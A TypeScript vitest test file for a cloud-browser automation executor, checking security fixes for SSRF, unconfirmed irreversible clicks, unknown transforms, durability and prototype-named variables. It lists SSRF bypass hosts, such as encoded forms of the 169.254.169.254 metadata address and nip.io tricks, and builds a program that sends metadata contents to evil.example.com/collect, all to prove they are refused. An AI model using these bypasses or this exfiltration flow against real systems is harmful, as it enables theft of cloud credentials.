import { Hono } from "hono";
import { describe, expect, it } from "vitest";
import { loadConfig } from "../src/config";
import { createBrowserbaseApi, createBrowserbaseExecutor, createUrlRewriter, isPrivateHost, type CdpConnector } from "../src/executors/browserbase";
import { compile, createComposioExecutor, renderArgs } from "../src/executors/composio";
import { isPrivateAddress } from "../src/executors/netguard";
import { createSemaphore } from "../src/executors/pool";
import { irreversibleEffects } from "../src/executors/steps";
import { ExecutorRefusal, type ExecuteJob } from "../src/executors/types";
import { parseProgram } from "../src/executors/validation";
import { chatJsonResponse, fakeFetch as fakeLlm } from "../src/llm/testing";
import type { SynthesizeResult } from "../src/loop/synthesize";
import { SHORTHAND_INVOICES, synthesizeBody } from "../src/loop/testing";
import { applyLoopTransform, type LoopTransform, type ServerLoopProgram, type ServerLoopStep } from "../src/loop/transforms";
import { registerExecuteRoutes } from "../src/routes/execute";
import { registerLoopRoutes } from "../src/routes/loop";
import { DEMO, FakeCloud, PUBLIC_DEMO, fakeBrowserbase, fakeFetch, invoiceItems, invoiceJob, invoiceProgram, isRelease, publicLookup } from "./executors.fixtures";

const JSON_HEADERS = { "Content-Type": "application/json" };
const CREDS = { apiKey: "bb-test-key", projectId: "proj-1" };
const SITE = "https://billing.example.com";
const noSleep = async (): Promise<void> => undefined;

function executor(cloud: FakeCloud, extra: Partial<Parameters<typeof createBrowserbaseExecutor>[0]> = {}, bb = fakeBrowserbase()) {
  return { bb, run: createBrowserbaseExecutor({ credentials: CREDS, lookup: publicLookup, publicDemoUrl: PUBLIC_DEMO, fetch: bb.fetch, connect: cloud.connect, sleep: noSleep, ...extra }) };
}

/** A job on a public site, so no rewrite is involved. */
function publicJob(steps: ServerLoopStep[], overrides: Partial<ExecuteJob> = {}): ExecuteJob {
  const program: ServerLoopProgram = { ...invoiceProgram(SITE), steps, irreversible: [] };
  return { program, items: invoiceItems(1, SITE), confirmIrreversible: true, baseUrl: SITE, ...overrides };
}

describe("finding 2: SSRF guard for cloud browsers", () => {
  const BYPASSES = [
    "localhost.", "[::ffff:127.0.0.1]", "[::ffff:169.254.169.254]", "[::ffff:7f00:1]", "[fe80::1]", "[::]", "0.0.0.1", "100.64.0.1", "100.100.100.200",
    "metadata.google.internal", "intranet", "127.0.0.1.nip.io", "10.0.0.1.sslip.io", "2130706433", "0x7f000001", "127.1", "[64:ff9b::7f00:1]", "[2002:7f00:1::]",
    "[fd00::1]", "[fec0::1]", "[ff02::1]", "192.0.0.8", "198.18.0.1", "224.0.0.1", "255.255.255.255", "app.corp", "nas.lan", "not a host",
  ];

  it("recognises every address a cloud browser must not be sent to", () => {
    for (const host of BYPASSES) expect([host, isPrivateHost(host)]).toEqual([host, true]);
    for (const host of ["example.com", "docs.google.com", "8.8.8.8", "172.32.0.1", "100.128.0.1", "[2606:4700:4700::1111]", "[::ffff:8.8.8.8]", "localhost.example.com", "internal.example.com"]) {
      expect([host, isPrivateHost(host)]).toEqual([host, false]);
    }
    expect(["127.0.0.1", "::1", "fe80::1%en0", "::ffff:10.0.0.1", "169.254.169.254", "garbage"].map(isPrivateAddress)).toEqual([true, true, true, true, true, true]);
    expect(["93.184.216.34", "2606:4700:4700::1111"].map(isPrivateAddress)).toEqual([false, false]);
  });

  it("refuses them as a goto target and as a baseUrl", () => {
    const rewrite = createUrlRewriter(SITE);
    for (const host of BYPASSES.filter((h) => h !== "not a host")) {
      expect(() => rewrite(`http://${host}/latest/meta-data/`), host).toThrow(ExecutorRefusal);
      expect(() => createUrlRewriter(`http://${host}`), host).toThrow(ExecutorRefusal);
    }
  });

  it("refuses the verified attack at preview time, before any session is billed", async () => {
    const bb = fakeBrowserbase();
    const cloud = new FakeCloud({ texts: { body: "secret-credentials" } });
    const hono = new Hono();
    registerExecuteRoutes(hono, loadConfig({ BROWSERBASE_API_KEY: "k", BROWSERBASE_PROJECT_ID: "p", GHOST_EXTENSION_ID: "abcdefghijklmnopabcdefghijklmnop" }), { fetch: bb.fetch, connect: cloud.connect, lookup: publicLookup });
    const base = "http://[::ffff:169.254.169.254]";
    const at = { origin: "https://evil.example.com", pathPattern: "/collect" };
    const program = {
      ...invoiceProgram(base),
      steps: [
        { op: "open-item" },
        { op: "extract", var: "leak", from: { pathPattern: "/latest/:id", locator: { by: "css", value: "body" } } },
        { op: "goto", origin: at.origin, pathPattern: at.pathPattern, url: `${at.origin}${at.pathPattern}` },
        { op: "fill", target: { label: "q", kind: "text" }, value: { var: "leak" }, at },
      ],
      irreversible: [],
    };
    const body = { mode: "parallel", program, items: [{ index: 0, url: `${base}/latest/meta-data`, vars: {} }], baseUrl: base };
    for (const path of ["/v1/loop/preview", "/v1/loop/execute"]) {
      const res = await hono.request(path, { method: "POST", headers: { ...JSON_HEADERS, Origin: "chrome-extension://abcdefghijklmnopabcdefghijklmnop" }, body: JSON.stringify({ ...body, confirmToken: "x" }) });
      expect([path, res.status]).toEqual([path, path.endsWith("preview") ? 400 : 409]);
      if (path.endsWith("preview")) expect(((await res.json()) as { error: string }).error).toMatch(/Cloud browsers cannot reach http:\/\/\[::ffff:a9fe:a9fe\]/);
    }
    expect(bb.calls).toHaveLength(0);
    expect(cloud.visits).toHaveLength(0);
  });

  it("checks DNS: a public name that resolves to a private address, or does not resolve, is refused", async () => {
    const cloud = new FakeCloud();
    const job = publicJob([{ op: "open-item" }]);
    const rebinding = executor(cloud, { lookup: async (host) => (host === "billing.example.com" ? ["93.184.216.34", "127.0.0.1"] : ["93.184.216.34"]) });
    await expect(rebinding.run.check(job)).rejects.toThrow(/billing\.example\.com: it resolves to a private address/);
    await expect(rebinding.run.run(job)).rejects.toBeInstanceOf(ExecutorRefusal);
    await expect(executor(cloud, { lookup: async () => Promise.reject(new Error("ENOTFOUND")) }).run.check(job)).rejects.toThrow(/Cannot resolve/);
    expect(rebinding.bb.calls).toHaveLength(0);
    await expect(executor(cloud).run.check(job)).resolves.toBeUndefined();
  });

  it("pre-checks `at` pages too, and refuses an `at` origin the program never navigates to", async () => {
    const cloud = new FakeCloud();
    const fillAt = (origin: string): ServerLoopStep => ({ op: "fill", target: { label: "Note", kind: "text" }, value: { const: "x" }, at: { origin, pathPattern: "/admin" } });
    const { run, bb } = executor(cloud);
    await expect(run.run(publicJob([{ op: "open-item" }, fillAt("https://elsewhere.example.org")]))).rejects.toThrow(/origin the loop never navigates to/);
    const privateGoto: ServerLoopStep = { op: "goto", origin: "http://192.168.1.10", pathPattern: "/admin", url: "http://192.168.1.10/admin" };
    await expect(run.run(publicJob([{ op: "open-item" }, privateGoto, fillAt("http://192.168.1.10")]))).rejects.toThrow(/Cloud browsers cannot reach http:\/\/192\.168\.1\.10/);
    expect(bb.calls).toHaveLength(0);
  });

  it("stops when a public URL redirects to another site with the same path: nothing is read and nothing is written afterwards", async () => {
    const cloud = new FakeCloud({ texts: { body: "secret-credentials" }, redirect: (url) => (url.includes("/invoices/") ? url.replace(SITE, "http://169.254.169.254") : url) });
    const steps: ServerLoopStep[] = [
      { op: "open-item" },
      { op: "extract", var: "leak", from: { pathPattern: "/invoices/:id", locator: { by: "css", value: "body" } } },
      { op: "goto", origin: "https://collector.example.org", pathPattern: "/collect", url: "https://collector.example.org/collect" },
      { op: "fill", target: { label: "q", kind: "text" }, value: { var: "leak" } },
    ];
    const report = await executor(cloud).run.run(publicJob(steps, { items: [{ ...invoiceItems(1, SITE)[0]!, vars: {} }] }));
    expect(report.results).toEqual([{ index: 2, ok: false, steps: 0, error: "step 0 (open-item): landed on a different site" }]);
    expect(cloud.fills).toHaveLength(0);
    expect(cloud.visits).toHaveLength(1);
  });

  it("never reads, fills or clicks once a click has taken the browser to a site outside the confirmed origins", async () => {
    const cloud = new FakeCloud({ texts: { total: "1" } });
    const connect: CdpConnector = async (url) => {
      const browser = await cloud.connect(url);
      const page = await browser.page();
      let hijacked = false;
      return { ...browser, page: async () => ({ ...page, url: () => (hijacked ? "https://evil.example.com/collect" : page.url()), click: async (t) => (await page.click(t), void (hijacked = true)) }) };
    };
    const steps: ServerLoopStep[] = [
      { op: "open-item" },
      { op: "click", target: { label: "Open details", kind: "button" }, locked: false },
      { op: "extract", var: "total", from: { pathPattern: "/invoices/:id", locator: { by: "data-field", value: "total" } } },
      { op: "fill", target: { label: "Note", kind: "text" }, value: { const: "x" } },
    ];
    const report = await executor(cloud, { connect }).run.run(publicJob(steps, { items: [{ ...invoiceItems(1, SITE)[0]!, vars: {} }] }));
    expect(report.results[0]).toMatchObject({ ok: false, steps: 2, error: "step 2 (extract): the browser is on a site this loop was not recorded on" });
    expect(cloud.fills).toHaveLength(0);
  });
});

describe("finding 9: SHABANG_PUBLIC_DEMO_URL only ever replaces a private baseUrl", () => {
  it("leaves a public site alone", () => {
    expect(createUrlRewriter("https://real.example.com", "https://demo.example.dev")("https://real.example.com/mail/1")).toBe("https://real.example.com/mail/1");
    expect(createUrlRewriter(DEMO, "https://demo.example.dev/app/")(`${DEMO}/mail/1`)).toBe("https://demo.example.dev/app/mail/1");
  });

  it("runs a loop recorded on a public site against that site, not against the demo host", async () => {
    const cloud = new FakeCloud();
    await executor(cloud, { publicDemoUrl: "https://demo.example.dev" }).run.run(publicJob([{ op: "open-item" }]));
    expect(cloud.visits).toEqual([`${SITE}/invoices/INV-1003`]);
  });
});

describe("finding 3: every click of a server-run batch needs the confirmation", () => {
  const LABELS = ["Reply", "Reply: received", "Archive", "Save", "Save changes", "Forward", "Share", "Order", "Continue", "Next", "Mark as paid", "Upload"];
  const clicks = (): ServerLoopStep[] => [{ op: "open-item" }, ...LABELS.map((label): ServerLoopStep => ({ op: "click", target: { label, kind: "button" }, locked: false }))];

  it("lists clicks the label regex does not know, whatever the client's locked flag says", () => {
    expect(irreversibleEffects(publicJob(clicks()).program).map((e) => e.description)).toEqual(LABELS);
    expect(irreversibleEffects(publicJob([{ op: "open-item" }, { op: "fill", target: { label: "Note", kind: "text" }, value: { const: "x" } }]).program)).toEqual([]);
  });

  it("refuses the unconfirmed job that used to run to completion", async () => {
    const cloud = new FakeCloud();
    const { run, bb } = executor(cloud);
    await expect(run.run(publicJob(clicks(), { confirmIrreversible: false }))).rejects.toMatchObject({ name: "ExecutorRefusal", details: { irreversible: LABELS.map((description, i) => ({ stepIndex: i + 1, description })) } });
    expect([bb.calls.length, cloud.clicks.length]).toEqual([0, 0]);
  });
});

describe("finding 7: programs from /v1/loop/synthesize run as they were verified", () => {
  it("accepts the whole closed transform list, and nothing else", () => {
    const withTransform = (transform: string): unknown => ({
      ...invoiceProgram(),
      steps: [{ op: "open-item" }, { op: "extract", var: "v", from: { pathPattern: "/invoices/:id", locator: { by: "data-field", value: "vendor" }, transform } }],
      irreversible: [],
    });
    for (const transform of ["trim", "number", "date-iso", "lowercase", "uppercase", "first-word", "last-word", "digits-only"]) expect(() => parseProgram(withTransform(transform))).not.toThrow();
    expect(() => parseProgram(withTransform("eval"))).toThrow(/transform must be one of: trim, number, date-iso, lowercase, uppercase, first-word, last-word, digits-only/);
  });

  it("feeds a model-assisted program straight into /v1/loop/compile", async () => {
    const llm = fakeLlm(() => chatJsonResponse(JSON.stringify({ answers: { s0: { candidate: 1, transform: "first-word" }, s1: { candidate: 2, transform: "digits-only" } } })));
    const hono = new Hono();
    registerLoopRoutes(hono, loadConfig({ XAI_API_KEY: "test-key-not-real" }), { fetch: llm.fetch });
    registerExecuteRoutes(hono, loadConfig({}));
    const synthesized = (await (await hono.request("/v1/loop/synthesize", { method: "POST", headers: JSON_HEADERS, body: JSON.stringify(synthesizeBody(SHORTHAND_INVOICES)) })).json()) as SynthesizeResult;
    const transforms = (synthesized.program?.steps ?? []).flatMap((s) => (s.op === "extract" ? [s.from.transform] : []));
    expect(transforms).toEqual(expect.arrayContaining(["first-word", "digits-only"]));
    const compiled = await hono.request("/v1/loop/compile", { method: "POST", headers: JSON_HEADERS, body: JSON.stringify({ program: synthesized.program }) });
    expect(compiled.status).toBe(200);
  });

  it("applies the extended transform at execution time, and never guesses for an unknown one", async () => {
    const cloud = new FakeCloud({ texts: { vendor: "Thistledown Textiles", number: "INV-2001" } });
    const steps: ServerLoopStep[] = [
      { op: "open-item" },
      { op: "extract", var: "vendor", from: { pathPattern: "/invoices/:id", locator: { by: "data-field", value: "vendor" }, transform: "first-word" } },
      { op: "extract", var: "digits", from: { pathPattern: "/invoices/:id", locator: { by: "data-field", value: "number" }, transform: "digits-only" } },
      { op: "fill", target: { label: "Vendor", kind: "text" }, value: { var: "vendor" } },
      { op: "fill", target: { label: "Number", kind: "text" }, value: { var: "digits" } },
    ];
    const report = await executor(cloud).run.run(publicJob(steps, { items: [{ ...invoiceItems(1, SITE)[0]!, vars: {} }] }));
    expect(report.results[0]?.ok).toBe(true);
    expect(cloud.fills.map((f) => f.value)).toEqual(["Thistledown", "2001"]);
    // The shared applyTransform reads any unknown transform as a date; the server's never does.
    expect(applyLoopTransform("Sep 3, 2026", "reverse" as LoopTransform)).toBeNull();
    expect(applyLoopTransform("Sep 3, 2026", "date-iso")).toBe("2026-09-03");
  });
});

describe("finding 8: parallel mode proves the first row is durable before it goes on", () => {
  it("reads the first item's row back from a second cloud browser, before the locked reply and before any other item", async () => {
    const cloud = new FakeCloud();
    const { run, bb } = executor(cloud);
    const report = await run.run(invoiceJob(3));
    expect(report).toMatchObject({ durability: "verified", results: [{ ok: true }, { ok: true }, { ok: true }] });
    expect(bb.calls.filter((c) => !isRelease(c))).toHaveLength(4); // 3 items + 1 verification
    expect(bb.calls.filter(isRelease)).toHaveLength(4);
    expect(cloud.open).toBe(0);
  });

  it("stops after the first item, with no irreversible step run, when the site keeps its state inside the browser (the localStorage demo)", async () => {
    const cloud = new FakeCloud({ durable: false });
    const report = await executor(cloud).run.run(invoiceJob(3));
    expect(report.durability).toBe("unverified");
    expect(report.results[0]).toMatchObject({ index: 2, ok: false, steps: 10, touched: true, error: expect.stringMatching(/could not be read back from a second cloud browser/) });
    expect(report.results.slice(1).map((r) => r.error)).toEqual(["skipped: the run stopped after item 2 failed", "skipped: the run stopped after item 2 failed"]);
    expect(cloud.clicks).toHaveLength(0);
    expect(cloud.open).toBe(0);
  });

  it("says so when a program writes nothing it can read back", async () => {
    const report = await executor(new FakeCloud()).run.run(publicJob([{ op: "open-item" }, { op: "click", target: { label: "Reply: received", kind: "button" }, locked: true }]));
    expect(report).toMatchObject({ durability: "unverified", results: [{ ok: true }] });
  });

  it("loads the configured Browserbase context read-only, so cloud browsers start logged in", async () => {
    const bb = fakeBrowserbase();
    await createBrowserbaseApi({ ...CREDS, contextId: "ctx-1" }, { fetch: bb.fetch }).createSession();
    expect(bb.calls[0]?.body).toMatchObject({ projectId: "proj-1", browserSettings: { context: { id: "ctx-1", persist: false } } });
    expect(loadConfig({ BROWSERBASE_API_KEY: "k", BROWSERBASE_PROJECT_ID: "p", BROWSERBASE_CONTEXT_ID: "ctx-1" }).browserbase?.contextId).toBe("ctx-1");
    const plain = fakeBrowserbase();
    await createBrowserbaseApi(CREDS, { fetch: plain.fetch }).createSession();
    expect(plain.calls[0]?.body).not.toHaveProperty("browserSettings");
  });
});

describe("finding 4: the session cap is shared by every run of the executor", () => {
  it("never opens more cloud browsers than the limit across two concurrent runs", async () => {
    const cloud = new FakeCloud({ stepDelayMs: 2 });
    const { run } = executor(cloud, { concurrency: 2 });
    const openOnly = (): ExecuteJob => publicJob([{ op: "open-item" }], { items: invoiceItems(6, SITE) });
    const reports = await Promise.all([run.run(openOnly()), run.run(openOnly())]);
    expect(reports.every((r) => r.results.every((x) => x.ok))).toBe(true);
    expect(cloud.maxOpen).toBe(2);
  });

  it("hands slots over in order and ignores a double release", async () => {
    const semaphore = createSemaphore(1);
    const first = await semaphore.acquire();
    let second = false;
    const waiting = semaphore.acquire().then((release) => ((second = true), release));
    await Promise.resolve();
    expect(second).toBe(false);
    first();
    first();
    (await waiting)();
    expect(second).toBe(true);
    await expect(Promise.all([semaphore.acquire()])).resolves.toHaveLength(1);
  });
});

describe("finding 10: var names and constants", () => {
  const post = (body: unknown): Promise<Response> => {
    const hono = new Hono();
    registerExecuteRoutes(hono, loadConfig({}));
    return Promise.resolve(hono.request("/v1/loop/preview", { method: "POST", headers: JSON_HEADERS, body: JSON.stringify(body) }));
  };

  it("rejects var names that every object inherits", async () => {
    const { program, items, baseUrl } = invoiceJob(1);
    for (const name of ["constructor", "toString", "valueOf", "hasOwnProperty", "isPrototypeOf", "__proto__"]) {
      const asStep = { ...program, steps: [{ op: "open-item" }, { op: "fill", target: { label: "Vendor", kind: "text", cell: { row: "next-empty", colHeader: "Vendor" } }, value: { var: name } }], irreversible: [] };
      expect([name, (await post({ mode: "api", program: asStep, items, baseUrl })).status]).toEqual([name, 400]);
      const asItemVar = JSON.parse(JSON.stringify({ mode: "api", program, items, baseUrl }).replace('"vendor":', `"${name}":`)) as unknown;
      expect([name, (await post(asItemVar)).status]).toEqual([name, 400]);
    }
  });

  it("treats an inherited name as a missing value, never as a function, even without the route in front", async () => {
    const api = fakeFetch(() => ({ status: 200, json: { successful: true } }));
    const program = invoiceProgram();
    program.steps[6] = { op: "fill", target: { label: "Vendor", kind: "text", cell: { row: "next-empty", colHeader: "Vendor" } }, value: { var: "constructor" }, at: { origin: DEMO, pathPattern: "/sheet" } };
    const report = await createComposioExecutor({ settings: { apiKey: "k", userId: "u", defaults: { spreadsheetId: "s", sheetRange: "Sheet1", threadId: "t", senderEmail: "a@example.com" } }, fetch: api.fetch }).run(invoiceJob(1, { program }));
    expect(report.results[0]).toEqual({ index: 2, ok: false, steps: 0, error: "no value for {{constructor}}" });
    expect(api.calls).toHaveLength(0);

    const cloud = new FakeCloud();
    const steps: ServerLoopStep[] = [{ op: "open-item" }, { op: "fill", target: { label: "Vendor", kind: "text" }, value: { var: "toString" } }];
    const browser = await executor(cloud).run.run(publicJob(steps));
    expect(browser.results[0]).toMatchObject({ ok: false, error: "step 1 (fill): the item has no value for this field" });
    expect(cloud.fills).toHaveLength(0);
  });

  it("never expands {{...}} inside text the user typed or inside a button label", () => {
    const at = { origin: DEMO, pathPattern: "/mail/:id" };
    const program: ServerLoopProgram = {
      ...invoiceProgram(),
      name: "mail",
      steps: [
        { op: "open-item" },
        { op: "fill", target: { label: "Subject", kind: "text" }, value: { const: "Re: {{secretVar}} and {{{{x}}" }, at },
        { op: "fill", target: { label: "Message", kind: "textarea" }, value: { var: "note" }, at },
        { op: "click", target: { label: "Send", kind: "button" }, locked: true, at },
      ],
      irreversible: [],
    };
    const [send] = compile(program).tools;
    const args = renderArgs(send!, { note: "see {{secretVar}}", secretVar: "LEAK", recipientEmail: "a@example.com" });
    expect(args).toEqual({ recipient_email: "a@example.com", subject: "Re: {{secretVar}} and {{{{x}}", body: "see {{secretVar}}" });
    expect(JSON.stringify(args)).not.toContain("LEAK");
  });
});
